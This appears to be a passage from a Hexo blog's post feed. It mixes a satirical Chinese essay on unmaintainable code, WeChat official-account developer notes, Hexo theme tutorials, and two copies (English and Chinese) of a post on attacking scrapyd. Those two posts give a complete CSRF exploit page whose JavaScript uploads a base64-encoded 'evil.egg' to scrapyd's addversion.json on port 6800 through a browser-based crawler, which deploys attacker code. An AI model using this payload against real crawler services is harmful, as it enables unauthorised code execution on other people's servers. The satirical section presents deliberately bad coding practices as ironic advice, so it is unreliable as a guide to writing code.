的存在并开始称他们为特性。那些真心希望改变这些”特性“的人们就会有动力升级到新版本。这样从长期来说可以节省你的维护工作量，并从你的客户那里获得更多收入。<br>在你的产品发布每个新版本的时候都改变文件结构<br>没错，你的客户会要求向上兼容，那就去做吧。不过一定要确保向下是不兼容的。这样可以阻止客户从新版本回退，再配合一套合理的 bug 修复规则（见上一条），就可以确保每次新版本发布后，客户都会留在新版本。学有余力的话，还可以想办法让旧版本压根无法识别新版本产生的文件。那样的话，老版本系统不但无法读取新文件，甚至会否认这些文件是自己的应用系统产生的！温馨提示：PC 上的 Word 文字处理软件就典型地精于此道。<br>抵消 Bug<br>不用费劲去代码里找 bug 的根源。只要在更高级的例程里加入一些抵销它的代码就行了。这是一种很棒的智力测验，类似于玩3D棋，而且能让将来的代码维护者忙乎很长时间都想不明白问题到底出在哪里：是产生数据的低层例程，还是莫名其妙改了一堆东西的高层代码。这一招对天生需要多回合执行的编译器也很好用。你可以在较早的回合完全避免修复问题，让较晚的回合变得更加复杂。如果运气好，你永远都不用和编译器前端打交道。学有余力的话，在后端做点手脚，一旦前端产生的是正确的数据，就让后端报错。<br>使用旋转锁<br>不要用真正的同步原语，多种多样的旋转锁更好 – 反复休眠然后测试一个(non-volatile的) 全局变量，直到它符合你的条件为止。相比系统对象，旋转锁使用简便，”通用“性强，”灵活“多变，实为居家旅行必备。<br>随意安插 sync 代码<br>把某些系统同步原语安插到一些用不着它们的地方。本人曾经在一段不可能会有第二个线程的代码中看到一个临界区（critical section）代码。本人当时就质问写这段代码的程序员，他居然理直气壮地说这么写是为了表明这段代码是很”关键“（也是critical）的！<br>优雅降级<br>如果你的系统包含了一套 NT 设备驱动，就让应用程序负责给驱动分配 I/O 缓冲区，然后在任何交易过程中对内存中的驱动加锁，并在交易完成后释放或解锁。这样一旦应用非正常终止，I/O缓存又没有被解锁，NT服务器就会当机。但是在客户现场不太可能会有人知道怎么弄好设备驱动，所以他们就没有选择（只能请你去免费旅游了）。<br>定制脚本语言<br>在你的 C/S 应用里嵌入一个在运行时按字节编译的脚本命令语言。<br>依赖于编译器的代码<br>如果你发现在你的编译器或解释器里有个bug，一定要确保这个bug的存在对于你的代码正常工作是至关重要的。毕竟你又不会使用其他的编译器，其他任何人也不允许！<br>一个货真价实的例子<br>下面是一位大师编写的真实例子。让我们来瞻仰一下他在这样短短几行 C 函数里展示的高超技巧。<br>void<em> Realocate(void</em>buf, int os, int ns)<br>{<br>void<em>temp;<br>temp = malloc(os);<br>memcpy((void</em>)temp, (void<em>)buf, os);<br>free(buf);<br>buf = malloc(ns);<br>memset(buf, 0, ns);<br>memcpy((void</em>)buf, (void<em>)temp, ns);<br>return buf;<br>}<br>重新发明了标准库里已有的简单函数。<br>Realocate 这个单词拼写错误。所以说，永远不要低估创造性拼写的威力。<br>无缘无故地给输入缓冲区产生一个临时的副本。<br>无缘无故地造型。 memcpy() 里有 (void</em>)，这样即使我们的指针已经是 (void*) 了也要再造型一次。另外这样可以传递任何东西作为参数，加10分。<br>永远不必费力去释放临时内存空间。这样会导致缓慢的内存泄露，一开始看不出来，要程序运行一段时间才行。<br>把用不着的东西也从缓冲区里拷贝出来，以防万一。这样只会在Unix上产生core dump，Windows 就不会。<br>很显然，os 和 ns 的含义分别是”old size” 和 “new size”。<br>给 buf 分配内存之后，memset 初始化它为 0。不要使用 calloc()，因为某些人会重写 ANSI 规范，这样将来保不齐 calloc() 往 buf 里填的就不是 0 了。（虽然我们复制过去的数据量和 buf 的大小是一样的，不需要初始化，不过这也无所谓啦）<br>如何修复 “unused variable” 错误<br>如果你的编译器冒出了 “unused local variable” 警告，不要去掉那个变量。相反，要找个聪明的办法把它用起来。我最喜欢的方法是：<br>i = i;<br>大小很关键<br>差点忘了说了，函数是越大越好。跳转和 GOTO 语句越多越好。那样的话，想做任何修改都需要分析很多场景。这会让维护代码的程序员陷入千头万绪之中。如果函数真的体型庞大的话，对于维护代码的程序员就是哥斯拉怪兽了，它会在他搞清楚情况之前就残酷无情地将他们踩翻在地。<br>一张图片顶1000句话，一个函数就是1000行<br>把每个方法体写的尽可能的长 – 最好是你写的任何方法或函数都没有少于1000行代码的，而且里边深度嵌套，这是必须的。<br>少个文件<br>一定要保证一个或多个关键文件是找不到的。利用includes 里边再 includes 就能做到这一点。例如，在你的 main 模块里，你写上：</p>
<p>#include &lt;stdcode.h&gt;<br>Stdcode.h 是有的。但是在 stdcode.h 里，还有个引用：</p>
<p>#include “a:\refcode.h”<br>然后，refcode.h 就没地方能找到了。<br>到处可写，无处可读<br>至少要把一个变量弄成这样：到处被设置，但是几乎没有哪里用到它。不幸的是，现代编译器通常会阻止你做相反的事：到处读，没处写。不过你在C 或 C++ 里还是可以这样做的。</p>
]]></content>
      <categories>
        <category>编程生涯</category>
      </categories>
  </entry>
  <entry>
    <title>微信公众号开发相关知识点文档分析大全</title>
    <url>/2020/02/13/weixin-2/</url>
    <content><![CDATA[<p>看完就会开发微信公众号了！<br><a id="more"></a></p>
<h1 id="微信公众号入门"><a href="#微信公众号入门" class="headerlink" title="微信公众号入门"></a>微信公众号入门</h1><ul>
<li>对应一个公众号，每一个用户有着不同的openid，以此来区别不用用户</li>
<li>如何使不同的应用用户互通，在<a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台</a>，将这些公众号和应用绑定到一个开放平台账号下,绑定后，一个用户虽然对多个公众号和应用有多个不同的OpenID，但他对所有这些同一开放平台账号下的公众号和应用，只有一个UnionID</li>
<li><p>公众平台以access_token为接口调用凭据，来调用接口，所有接口的调用需要先获取access_token，access_token在2小时内有效，过期需要重新获取，但1天内获取次数有限，开发者需自行存储，详见获取接口调用凭据（access_token）文档。这里我们需要缓存access_token或者其他有时效和次数限制的内容，这里有两种方法，一是通过redis缓存，并设定时间为7200秒，二是，通过txt文本保存在本地。</p>
</li>
<li><p>公众平台接口调用仅支持80端口，换句话说就是微信接口都是http的</p>
</li>
</ul>
<h1 id="公众号消息分类"><a href="#公众号消息分类" class="headerlink" title="公众号消息分类"></a>公众号消息分类</h1><ul>
<li>群发消息——就是最常见的公众号文章、文字和图片等群发，订阅号每天一次，服务号每月四次</li>
<li>被动回复消息——用户订阅后或者发送消息给公众号，自动回复的消息</li>
<li>客服消息——在用户给公众号发消息后的48小时内，公众号可以给用户发送不限数量的消息</li>
<li>模板消息：在需要对用户发送服务通知，是必须使用特定的模板</li>
</ul>
<h1 id="公众号H5"><a href="#公众号H5" class="headerlink" title="公众号H5"></a>公众号H5</h1><ul>
<li>获取用户信息，这里分为两种<code>snsapi_base</code>和<code>snsapi_userinfo</code>，前者是静默授权只获取用户openid,后者需要用户手动同意获取用户基本信息。前者用于支付等操作，后者用于获取用户微信头像和名称<br>请求接口<br>POST URL: <a href="https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=ACCESS_TOKEN" target="_blank" rel="noopener">https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=ACCESS_TOKEN</a><br>POST Data: json</li>
<li>微信JS-SDK：是开发者在网页上通过JavaScript代码使用微信原生功能的工具包，开发者可以使用它在网页上录制和播放微信语音、监听微信分享、上传手机本地图片、拍照等许多能力。不同于H5，很多接口必须通过JS-SDK才能实现，比如微信分享等。</li>
</ul>
<h1 id="IOS的公众号网页问题"><a href="#IOS的公众号网页问题" class="headerlink" title="IOS的公众号网页问题"></a>IOS的公众号网页问题</h1><p><a href="https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/iOS_WKWebview.html" target="_blank" rel="noopener">WKWebview和UIWebview问题</a></p>
]]></content>
      <categories>
        <category>微信</category>
      </categories>
      <tags>
        <tag>微信文档</tag>
      </tags>
  </entry>
  <entry>
    <title>微信客服消息报错45015</title>
    <url>/2020/02/13/weixin-1/</url>
    <content><![CDATA[<p>微信客服消息报错45015解决办法<br><a id="more"></a></p>
<p><img src="https://i.loli.net/2020/02/13/Rm97bNcifQTGtIu.png" alt="微信截图_20200213225514.png"></p>
<p>微信客服推送信息发送报文：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;touser&quot;:&quot;testOpenId&quot;,</span><br><span class="line">    &quot;msgtype&quot;:&quot;text&quot;,</span><br><span class="line">    &quot;text&quot;:&#123;</span><br><span class="line">        &quot;content&quot;:&quot;你好&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>正常返回报文如下，表示发送成功<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;errcode&quot;:0,</span><br><span class="line">    &quot;errmsg&quot;:&quot;ok&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>报45015错误的接收报文：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;errcode&quot;:45015,</span><br><span class="line">    &quot;errmsg&quot;:&quot;response out of time limit or subscription is canceled hint: [ZE1Uxa0498age8]&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>由于该用户48小时未与你互动，你不能再主动发消息给他。直到用户下次主动发消息给你才可以对其进行回复。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/10/weixin-7/">app、公众号网页和小程序实现用户账号统一</a></li><li><a href="https://thelighter.github.io/2020/05/10/weixin-6/">微信app登录教程</a></li><li><a href="https://thelighter.github.io/2020/05/10/weixin-5/">微信公众号网页jssdk使用方法</a></li><li><a href="https://thelighter.github.io/2020/04/25/weixin-4/">微信公众号H5网页登录授权过程</a></li></ul></div>]]></content>
      <categories>
        <category>微信</category>
      </categories>
      <tags>
        <tag>微信</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy framework attack</title>
    <url>/2020/02/13/scrapy-attack-en/</url>
    <content><![CDATA[<p>How to attack scrapy<br><a id="more"></a></p>
<h1 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h1><p>Scrapy is a crawler framework, and scrapyd is a cloud service. Users can upload the crawler developed by the scrapy framework to the cloud, and then call this crawler to crawl information through Web API.</p>
<p>scrapyd mainly provides the following APIs:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/daemonstatus.json Get the status of the cloud service</span><br><span class="line">/addversion.json upload a new crawler project, or update the code of an existing project</span><br><span class="line">/schedule.json performs a crawl task</span><br><span class="line">/cancel.json stop and cancel a task</span><br><span class="line">/listprojects.json List all projects in the cloud</span><br><span class="line">/listversions.json lists all code versions of a project</span><br><span class="line">/listspiders.json List all spiders in a project. The concept of spider is in the scrapy framework. A spider developed by scrapy can have multiple spiders</span><br><span class="line">/listjobs.json lists all tasks, including three states in progress, completed, and pending</span><br><span class="line">/delversion.json delete a code version under a project</span><br><span class="line">/delversion.json delete an item</span><br></pre></td></tr></table></figure></p>
<p>In simple terms, there can be multiple projects under the scrapyd cloud service, and each project can have multiple code versions. Each code version is a complete scrapy project, and there can be multiple spiders under a scrapy project. The final task The carrier is a spider.<br>An attacker can create a project and deploy his own version of scrapy code, deploy malicious code to the cloud, and then attack the scrapyd cloud.</p>
<h1 id="Use-CSRF-vulnerability-to-attack-browser-crawlers"><a href="#Use-CSRF-vulnerability-to-attack-browser-crawlers" class="headerlink" title="Use CSRF vulnerability to attack browser crawlers"></a>Use CSRF vulnerability to attack browser crawlers</h1><p>The attack on port 6800 can be reproduced locally, but the target site’s 6800 is enabled on the internal network and we cannot directly access it.</p>
<p>This URL is executed by the browser, and all scrapyd API interfaces can actually perform CSRF attacks, so we can use JavaScript in the page to send POST packets to port 6800, and then call those non-GET APIs.</p>
<p>Construct a page that sends a POST upload request to <a href="http://127.0.0.1:6800/addversion.json" target="_blank" rel="noopener">http://127.0.0.1:6800/addversion.json</a>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv = &quot;content-type&quot; content = &quot;text / html; charset = utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt; upload csrf &lt;/ title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type = &quot;text / javascript&quot; charset = &quot;utf-8&quot;&gt;</span><br><span class="line">  function b64toBlob (b64Data, contentType, sliceSize) &#123;</span><br><span class="line">        contentType = contentType || &apos;&apos;;</span><br><span class="line">        sliceSize = sliceSize || 512;</span><br><span class="line"></span><br><span class="line">        var byteCharacters = atob (b64Data);</span><br><span class="line">        var byteArrays = [];</span><br><span class="line"></span><br><span class="line">        for (var offset = 0; offset &lt;byteCharacters.length; offset + = sliceSize) &#123;</span><br><span class="line">            var slice = byteCharacters.slice (offset, offset + sliceSize);</span><br><span class="line"></span><br><span class="line">            var byteNumbers = new Array (slice.length);</span><br><span class="line">            for (var i = 0; i &lt;slice.length; i ++) &#123;</span><br><span class="line">                byteNumbers [i] = slice.charCodeAt (i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var byteArray = new Uint8Array (byteNumbers);</span><br><span class="line"></span><br><span class="line">            byteArrays.push (byteArray);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      var blob = new Blob (byteArrays, &#123;type: contentType&#125;);</span><br><span class="line">      return blob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    var blob = b64toBlob (&quot;base64 data of evil.egg ...&quot;, &apos;application / octet-stream&apos;)</span><br><span class="line"></span><br><span class="line">    var myFormData = new FormData ();</span><br><span class="line">    myFormData.append (&quot;egg&quot;, blob, &quot;evil.egg&quot;);</span><br><span class="line">    myFormData.append (&quot;project&quot;, &quot;evil_project_01&quot;)</span><br><span class="line">    myFormData.append (&quot;version&quot;, &quot;r01&quot;)</span><br><span class="line">    fetch (&quot;http://127.0.0.1:6800/addversion.json&quot;, &#123;</span><br><span class="line">        method: &quot;post&quot;,</span><br><span class="line">        body: myFormData</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/ script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ body&gt;</span><br><span class="line">&lt;/ html&gt;</span><br></pre></td></tr></table></figure>
<p>It is worth noting that because we are uploading a binary file, I base.64 the evil.egg encoding: cat evil.egg | base64, and then convert it into a Blob object in JavaScript and add it to FormData.</p>
<p>Submit this page to the crawler for crawling and successfully complete the entire exploitation process.</p>
]]></content>
      <categories>
        <category>scrapy</category>
      </categories>
      <tags>
        <tag>infiltration</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy框架攻击</title>
    <url>/2020/02/13/scrapy-attack/</url>
    <content><![CDATA[<p>如何攻击scrapy<br><a id="more"></a></p>
<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>scrapy是一个爬虫框架，而scrapyd是一个云服务，用户可以将自己用scrapy框架开发的爬虫上传到云端，然后通过Web API调用这个爬虫爬取信息。</p>
<p>scrapyd主要提供以下一些API：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/daemonstatus.json 获取云服务的状态</span><br><span class="line">/addversion.json 上传一个新的爬虫项目，或者给一个已有的项目更新代码</span><br><span class="line">/schedule.json 执行一个爬取任务</span><br><span class="line">/cancel.json 停止并取消一个任务</span><br><span class="line">/listprojects.json 列出云端的所有项目</span><br><span class="line">/listversions.json 列出某个项目的所有代码版本</span><br><span class="line">/listspiders.json 列出一个项目下所有spider，spider这个概念是scrapy框架中的，一个scrapy开发的爬虫可以有多个spider</span><br><span class="line">/listjobs.json 列出所有任务，包括正在进行的、已完成的、等待执行的三个状态</span><br><span class="line">/delversion.json 删除某个项目下的某个代码版本</span><br><span class="line">/delversion.json 删除某个项目</span><br></pre></td></tr></table></figure></p>
<p>简单来说，scrapyd云服务下可以有多个项目，每个项目下可以有多个代码版本，每个代码版本就是一个完整的scrapy项目，一个scrapy项目下可以有多个spider，最终执行的任务的载体是一个spider。<br>攻击者可以创建一个项目，并部署他自己的scrapy代码版本，将恶意代码部署到云端，进而对scrapyd云端进行攻击。</p>
<h1 id="利用CSRF漏洞攻击浏览器爬虫"><a href="#利用CSRF漏洞攻击浏览器爬虫" class="headerlink" title="利用CSRF漏洞攻击浏览器爬虫"></a>利用CSRF漏洞攻击浏览器爬虫</h1><p>针对6800端口的攻击在本地可以复现了，但是目标网站的6800是开启在内网的，我们无法直接访问。</p>
<p>这个URL是被浏览器执行的，而scrapyd的所有API接口实际上都是可以进行CSRF攻击的，所以我们可以利用页面中的JavaScript发送POST数据包给6800端口，进而调用那些非GET型的API。</p>
<p>构造一个向<a href="http://127.0.0.1:6800/addversion.json发送POST上传请求的页面：" target="_blank" rel="noopener">http://127.0.0.1:6800/addversion.json发送POST上传请求的页面：</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line"></span><br><span class="line">  &lt;title&gt;upload csrf&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;</span><br><span class="line">  function b64toBlob(b64Data, contentType, sliceSize) &#123;</span><br><span class="line">        contentType = contentType || &apos;&apos;;</span><br><span class="line">        sliceSize = sliceSize || 512;</span><br><span class="line"></span><br><span class="line">        var byteCharacters = atob(b64Data);</span><br><span class="line">        var byteArrays = [];</span><br><span class="line"></span><br><span class="line">        for (var offset = 0; offset &lt; byteCharacters.length; offset += sliceSize) &#123;</span><br><span class="line">            var slice = byteCharacters.slice(offset, offset + sliceSize);</span><br><span class="line"></span><br><span class="line">            var byteNumbers = new Array(slice.length);</span><br><span class="line">            for (var i = 0; i &lt; slice.length; i++) &#123;</span><br><span class="line">                byteNumbers[i] = slice.charCodeAt(i);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var byteArray = new Uint8Array(byteNumbers);</span><br><span class="line"></span><br><span class="line">            byteArrays.push(byteArray);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      var blob = new Blob(byteArrays, &#123;type: contentType&#125;);</span><br><span class="line">      return blob;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    var blob = b64toBlob(&quot;base64 data of evil.egg...&quot;, &apos;application/octet-stream&apos;)</span><br><span class="line"></span><br><span class="line">    var myFormData = new FormData();</span><br><span class="line">    myFormData.append(&quot;egg&quot;, blob, &quot;evil.egg&quot;);</span><br><span class="line">    myFormData.append(&quot;project&quot;, &quot;evil_project_01&quot;)</span><br><span class="line">    myFormData.append(&quot;version&quot;, &quot;r01&quot;)</span><br><span class="line">    fetch(&quot;http://127.0.0.1:6800/addversion.json&quot;, &#123;</span><br><span class="line">        method: &quot;post&quot;,</span><br><span class="line">        body: myFormData</span><br><span class="line">    &#125;)</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>值得注意的是，因为我们要上传一个二进制文件，所以我将evil.egg进行的base64编码：cat evil.egg | base64，然后将其转换成JavaScript中的Blob对象，添加到FormData中。</p>
<p>将这个页面提交给爬虫进行爬取，成功完成整个利用过程。</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/02/22/sentou-1/">渗透的方法和思路</a></li></ul></div>]]></content>
      <categories>
        <category>scrapy</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 标签云安装和使用</title>
    <url>/2020/02/13/hexo-5/</url>
    <content><![CDATA[<p>Hexo Tag Cloud安装和使用<br><a id="more"></a></p>
<p><img src="https://github.com/MikeCoder/hexo-tag-cloud/raw/master/img/example.png" alt></p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-tag-cloud --save</span><br></pre></td></tr></table></figure>
<h1 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h1><p>这里以 Next 主题为例。<br>找到文件 next/layout/_macro/sidebar.swig, 然后添加如下内容。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if site.tags.length &gt; 1 %&#125;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;&#123;&#123; url_for(&apos;/js/tagcloud.js&apos;) &#125;&#125;&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot; src=&quot;&#123;&#123; url_for(&apos;/js/tagcanvas.js&apos;) &#125;&#125;&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;div class=&quot;widget-wrap&quot;&gt;</span><br><span class="line">    &lt;h3 class=&quot;widget-title&quot;&gt;Tag Cloud&lt;/h3&gt;</span><br><span class="line">    &lt;div id=&quot;myCanvasContainer&quot; class=&quot;widget tagcloud&quot;&gt;</span><br><span class="line">        &lt;canvas width=&quot;250&quot; height=&quot;250&quot; id=&quot;resCanvas&quot; style=&quot;width=100%&quot;&gt;</span><br><span class="line">            &#123;&#123; list_tags() &#125;&#125;</span><br><span class="line">        &lt;/canvas&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>在你的博客根目录，找到 _config.yml 文件然后添加如下的配置项:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># hexo-tag-cloud</span><br><span class="line">tag_cloud:</span><br><span class="line">    textFont: Trebuchet MS, Helvetica</span><br><span class="line">    textColor: &apos;#333&apos;</span><br><span class="line">    textHeight: 25</span><br><span class="line">    outlineColor: &apos;#E2E1D1&apos;</span><br><span class="line">    maxSpeed: 0.5</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo标签云</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo next添加推荐文章</title>
    <url>/2020/02/13/hexo-4/</url>
    <content><![CDATA[<p>hexo添加推荐文章功能<br><a id="more"></a></p>
<h1 id="模块安装"><a href="#模块安装" class="headerlink" title="模块安装"></a>模块安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-recommended-posts --save</span><br></pre></td></tr></table></figure>
<h1 id="生成推荐文章"><a href="#生成推荐文章" class="headerlink" title="生成推荐文章"></a>生成推荐文章</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo recommend</span><br></pre></td></tr></table></figure>
<h1 id="自定义"><a href="#自定义" class="headerlink" title="自定义"></a>自定义</h1><p>自定义<br>本插件可以在零配置的情况下直接使用。</p>
<p>如果默认配置不能满足您的需求，您可以在博客根目录的_config.yml里覆盖默认配置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">recommended_posts:</span><br><span class="line">  server: https://api.truelaurel.com #后端推荐服务器地址</span><br><span class="line">  timeoutInMillis: 10000 #服务时长，超过此时长，则使用离线推荐模式</span><br><span class="line">  internalLinks: 3 #内部文章数量</span><br><span class="line">  externalLinks: 1 #外部文章数量</span><br><span class="line">  fixedNumber: false</span><br><span class="line">  autoDisplay: true #自动在文章底部显示推荐文章</span><br><span class="line">  excludePattern: []</span><br><span class="line">  titleHtml: &lt;h1&gt;推荐文章&lt;span style=&quot;font-size:0.45em; color:gray&quot;&gt;（由&lt;a href=&quot;https://github.com/huiwang/hexo-recommended-posts&quot;&gt;hexo文章推荐插件&lt;/a&gt;驱动）&lt;/span&gt;&lt;/h1&gt; #自定义标题</span><br></pre></td></tr></table></figure></p>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img src="https://i.loli.net/2020/02/13/iGD3xPUMp9v6Z4t.png" alt="hexo"></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo推荐文章</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo Next主题如何给文章下方添加广告位</title>
    <url>/2020/02/13/hexo-3/</url>
    <content><![CDATA[<p>hexo主题必备<br><a id="more"></a><br>效果图<br><img src="https://i.loli.net/2020/02/13/VymBwCndtQh3WZS.png" alt="微信截图_20200213000842.png"></p>
<h1 id="添加广告链接"><a href="#添加广告链接" class="headerlink" title="添加广告链接"></a>添加广告链接</h1><p>在 hexo 的 root 下的_config.yml 添加博客链接</p>
<h2 id="自定义广告"><a href="#自定义广告" class="headerlink" title="自定义广告"></a>自定义广告</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">advert:</span><br><span class="line">  广告: 图片链接 || 广告链接</span><br></pre></td></tr></table></figure>
<h1 id="添加广告插件"><a href="#添加广告插件" class="headerlink" title="添加广告插件"></a>添加广告插件</h1><p>在 next 主题目录 layout/_macro 下面添加 advert.swig<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;# Gallery support #&#125;</span><br><span class="line">      &#123;% if config.advert %&#125;</span><br><span class="line">        &lt;div class=&quot;post-gallery&quot; itemscope itemtype=&quot;http://schema.org/ImageGallery&quot;&gt;</span><br><span class="line">          &#123;% set COLUMN_NUMBER = 3 %&#125;</span><br><span class="line">          &#123;% for advert, link in config.advert %&#125;</span><br><span class="line">            &#123;% if loop.index0 % COLUMN_NUMBER === 0 %&#125;&lt;div class=&quot;post-gallery-row&quot;&gt;&#123;% endif %&#125;</span><br><span class="line">              &lt;a class=&quot;post-gallery-img fancybox&quot;</span><br><span class="line">                 href=&quot;&#123;&#123; link.split(&apos;||&apos;)[1] | trim &#125;&#125;&quot; rel=&quot;gallery_&#123;&#123; post._id &#125;&#125;&quot; target=&quot;_blank&quot;</span><br><span class="line">                 itemscope itemtype=&quot;http://schema.org/ImageObject&quot; itemprop=&quot;url&quot;&gt;</span><br><span class="line">                &lt;img src=&quot;&#123;&#123; link.split(&apos;||&apos;)[0] | trim &#125;&#125;&quot; itemprop=&quot;contentUrl&quot; alt=&quot;&#123;&#123;advert&#125;&#125;&quot;/&gt;</span><br><span class="line">              &lt;/a&gt;</span><br><span class="line">            &#123;% if loop.index0 % COLUMN_NUMBER === 2 %&#125;&lt;/div&gt;&#123;% endif %&#125;</span><br><span class="line">          &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">          &#123;# Append end tag for `post-gallery-row` when (photos size mod COLUMN_NUMBER) is less than COLUMN_NUMBER #&#125;</span><br><span class="line">          &#123;% if config.advert.length % COLUMN_NUMBER &gt; 0 %&#125;&lt;/div&gt;&#123;% endif %&#125;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">      &#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="使用插件"><a href="#使用插件" class="headerlink" title="使用插件"></a>使用插件</h1><p>修改 next 主题目录 layout/_macro 下面的post.swig<br>找到下面这行代码<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.wechat_subscriber.enabled and not is_index %&#125;</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123;% include &apos;wechat-subscriber.swig&apos; %&#125;</span><br><span class="line">      &lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
<p>在这段代码上面加入<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if not is_index%&#125;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">    &#123;% include &apos;advert.swig&apos; %&#125;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo广告位</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 给博客添加近期文章板块</title>
    <url>/2020/02/13/hexo-2/</url>
    <content><![CDATA[<p>如何给hexo的next主题添加近期文章<br><a id="more"></a></p>
<h1 id="修改sidebar-swig"><a href="#修改sidebar-swig" class="headerlink" title="修改sidebar.swig"></a>修改sidebar.swig</h1><p>next/layout/_macro/sidebar.swig 中的 if theme.links的endif下方</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.recent_posts %&#125;</span><br><span class="line">  &lt;div class=&quot;links-of-blogroll motion-element &#123;&#123; &quot;links-of-blogroll-&quot; + theme.recent_posts_layout  &#125;&#125;&quot;&gt;</span><br><span class="line">   &lt;div class=&quot;links-of-blogroll-title&quot;&gt;</span><br><span class="line">     &lt;!-- modify icon to fire by szw --&gt;</span><br><span class="line">     &lt;i class=&quot;fa fa-history fa-&#123;&#123; theme.recent_posts_icon | lower &#125;&#125;&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;</span><br><span class="line">     &#123;&#123; theme.recent_posts_title &#125;&#125;</span><br><span class="line">   &lt;/div&gt;</span><br><span class="line">   &lt;ul class=&quot;links-of-blogroll-list&quot;&gt;</span><br><span class="line">     &#123;% set posts = site.posts.sort(&apos;-date&apos;) %&#125;</span><br><span class="line">     &#123;% for post in posts.slice(&apos;0&apos;, &apos;5&apos;) %&#125;</span><br><span class="line">       &lt;li&gt;</span><br><span class="line">         &lt;a href=&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot; title=&quot;&#123;&#123; post.title &#125;&#125;&quot; target=&quot;_blank&quot;&gt;&#123;&#123; post.title 